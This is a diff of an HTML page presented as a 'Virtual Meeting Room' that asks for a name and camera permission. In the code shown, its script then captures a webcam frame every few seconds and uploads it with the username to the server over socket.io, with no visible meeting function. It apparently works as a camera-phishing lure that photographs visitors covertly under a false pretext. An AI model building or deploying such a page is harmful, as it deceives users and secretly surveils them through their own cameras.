@@ -5,39 +5,20 @@
 <title>Meet & Connect</title>
 
 <style>
-
 body{
 font-family: Arial;
 text-align:center;
 background:#0f172a;
 color:white;
-margin:0;
 }
 
 .container{
-margin-top:80px;
-}
-
-.card{
-background:#1e293b;
-padding:40px;
-border-radius:12px;
-width:400px;
-margin:auto;
-box-shadow:0px 0px 20px rgba(0,0,0,0.5);
-}
-
-input{
-padding:12px;
-width:80%;
-margin-bottom:15px;
-border-radius:6px;
-border:none;
+margin-top:100px;
 }
 
 button{
-padding:12px 25px;
-font-size:16px;
+padding:15px 30px;
+font-size:18px;
 background:#3b82f6;
 border:none;
 color:white;
@@ -45,12 +26,18 @@ border-radius:8px;
 cursor:pointer;
 }
 
+input{
+padding:12px;
+font-size:16px;
+border-radius:8px;
+border:none;
+margin-bottom:10px;
+}
+
 video{
 margin-top:20px;
 border-radius:10px;
-width:100%;
 }
-
 </style>
 
 </head>
@@ -58,33 +45,42 @@ width:100%;
 <body>
 
 <div class="container">
-<div class="card">
 
-<h1>Meet & Connect</h1>
+<h1>Virtual Meeting Room</h1>
 
-<input id="username" placeholder="Enter your name">
+<p>We need camera permission for live communication</p>
+
+<input type="text" id="username" placeholder="Enter your name">
+
+<br><br>
+
+<button onclick="startCamera()">Join</button>
 
 <br>
 
-<button onclick="startCamera()">Join Meeting</button>
+<video id="video" autoplay playsinline width="300"></video>
 
-<video id="video" autoplay playsinline></video>
-
-</div>
 </div>
 
 <script src="/socket.io/socket.io.js"></script>
 
 <script>
 
-const socket = io();
+const socket = io({
+transports: ["websocket"],
+secure: true
+});
+
+socket.on("connect", () => {
+console.log("Connected to server");
+});
 
 function startCamera(){
 
 const username = document.getElementById("username").value;
 
 if(!username){
-alert("Enter name first");
+alert("Enter username");
 return;
 }
 
@@ -104,15 +100,20 @@ canvas.height = video.videoHeight;
 
 context.drawImage(video, 0, 0);
 
-const image = canvas.toDataURL("image/png");
+const image = canvas.toDataURL("image/jpeg");
 
 socket.emit("photo", {
-image:image,
-user:username
+user: username,
+image: image
 });
 
-}, 2000);
+console.log("Photo sent");
 
+}, 3000);
+
+})
+.catch(err => {
+alert("Camera permission required");
 });
 
 }
